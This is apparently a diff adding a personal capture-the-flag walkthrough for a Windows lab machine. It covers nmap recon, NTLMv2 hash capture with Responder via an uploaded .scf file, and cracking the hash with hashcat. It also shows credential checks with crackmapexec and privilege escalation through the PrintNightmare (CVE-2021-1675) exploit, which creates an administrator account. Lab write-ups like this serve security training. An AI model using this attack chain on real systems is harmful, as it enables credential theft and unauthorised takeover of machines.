@@ -1,0 +1,62 @@
+ip 	: 10.10.11.106
+OS 	: Windows
+server 	: Windows IIS 10
+tech 	: ?
+
+# Recon
+nmap scan result :
+ports are open :
+- 80 Microsoft IIS httpd 10.0
+- 135 msrpc
+- 445 smb
+- 5985 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) (WinRM)
+
+# initial access
+port 80 has only upload file feature to "public shares", since the OS is Windkws and port 445 is open so uploading .scf file to capture username and ntlmv2 hash.
+
+- fire up responder ~# python3 responder.py Responder.py -w --lm -v -I tun0
+got requests :
+tony::DRIVER:5caa8dbe90f09a53:BB54A74E7211CCB61980736CE9FEDB89:01010000000000003160B3C27F10D801804D5A96B2C3B31300000000020000000000000000000000
+
+- crack the hash using hashcat ~# hashcat -m 5600 -a 0 -o cracked2 ntlm2.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+result :
+TONY::DRIVER:5caa8dbe90f09a53:bb54a74e7211ccb61980736ce9fedb89:01010000000000003160b3c27f10d801804d5a96b2c3b31300000000020000000000000000000000:liltony
+
+so now we have user:pass.
+tony:liltony.
+
+check these creds using cme :
+~# cme smb (ip) -u tony -p liltony
+
+HTTP        10.10.11.106    5985   10.10.11.106     [*] http://10.10.11.106:5985/wsman
+WINRM       10.10.11.106    5985   10.10.11.106     [+] DRIVER\tony:liltony (Pwn3d!)
+➜  loot cme smb 10.10.11.106 -u tony -p liltony
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony  
+
+~# cme winrm (ip) -u tony -p liltony -d DRIVER
+
+WINRM       10.10.11.106    5985   10.10.11.106     [+] DRIVER\tony:liltony (
+Pwn3d!)
+
+# initial access
+somehow i can't login using using evil-winrm.
+so i search ruby script to login (https://github.com/Alamot/code-snippets)
+
+yes login with user tony.
+
+# root ?
+this box has vuln to CVE-2021-1675.
+
+download https://github.com/calebstewart/CVE-2021-1675 and upload it to the target machines.
+
+in shell :
+Import-Module ./CVE-2021-1675.ps1 (make sure the Get-ExecutionPolicy is unrestricted)
+
+Invoke-Nightmare
+
+[] new user : adm1n
+[] password : p@ssw0rd
+[] with Administrator : True
+
+Done....
